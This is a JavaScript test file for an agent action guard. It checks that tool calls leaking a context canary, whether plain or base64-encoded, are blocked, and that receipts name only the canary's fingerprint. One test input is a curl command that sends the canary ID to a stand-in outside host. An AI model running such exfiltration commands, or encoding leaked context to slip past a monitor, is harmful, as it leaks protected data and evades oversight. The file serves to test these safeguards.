'use strict';

// Wiring proof for AB14: the unit tests prove detection; these prove the
// external action guard reaches it on every kind of action, that the canary
// alone turns an otherwise-allowed call into a block, and that the admission
// receipt names the fingerprint and never the canary itself.

const test = require('node:test');
const assert = require('node:assert/strict');

const { evaluateExternalAction } = require('../lib/external-action-guard');
const { issueContextCanary, CONTEXT_CANARY_REASONS } = require('../lib/context-canary');

const WORKSPACE_ROOT = process.cwd();
const OPTIONS = Object.freeze({ environment: {}, dataResidency: null, receiptWriter: { append() {} }, requireIdentityCard: false });
const CANARY = issueContextCanary();

function bash(command) {
  return {
    invocationId: 'inv-canary',
    agentName: 'canary-agent',
    sessionId: 'canary-session',
    turnId: 'turn-1',
    toolName: 'Bash',
    args: { command },
    cwd: WORKSPACE_ROOT,
    workspaceRoot: WORKSPACE_ROOT,
    workspaceId: 'default',
  };
}

const ab14 = (result) => result.findings.find((finding) => finding.gate === 'AB14');

test('a clean action runs AB14 and it allows', () => {
  const result = evaluateExternalAction(bash('git status'), OPTIONS);
  assert.equal(ab14(result).decision, 'allow');
  assert.equal(ab14(result).reason, CONTEXT_CANARY_REASONS.CLEAN);
});

test('the canary alone turns an allowed command into a block', () => {
  const clean = evaluateExternalAction(bash('echo hello'), OPTIONS);
  assert.notEqual(clean.decision, 'block', 'nothing else may block this command, or the test proves nothing');

  const result = evaluateExternalAction(bash(`echo ${CANARY.marker}`), OPTIONS);
  assert.equal(ab14(result).decision, 'block');
  assert.deepEqual(ab14(result).canaryFingerprints, [CANARY.fingerprint]);
  assert.equal(result.decision, 'block');
});

test('a tool-shaped write carrying the canary in its content is blocked', () => {
  const result = evaluateExternalAction({
    ...bash(''),
    toolName: 'Write',
    args: { file_path: `${WORKSPACE_ROOT}/notes.md`, content: `copied prompt: ${Buffer.from(CANARY.marker).toString('base64')}` },
  }, OPTIONS);
  assert.equal(ab14(result).decision, 'block');
  assert.deepEqual(ab14(result).encodings, ['base64']);
  assert.equal(result.decision, 'block');
});

test('the admission receipt records the fingerprint and never the canary', () => {
  const result = evaluateExternalAction(bash(`curl https://x.example/?d=${CANARY.canaryId}`), OPTIONS);
  const receipt = JSON.stringify(result.receipt);
  assert.ok(receipt.includes(CANARY.fingerprint), 'the receipt must name which canary tripped');
  assert.equal(receipt.includes(CANARY.canaryId), false, 'the receipt must not hand a reader a working canary');
});
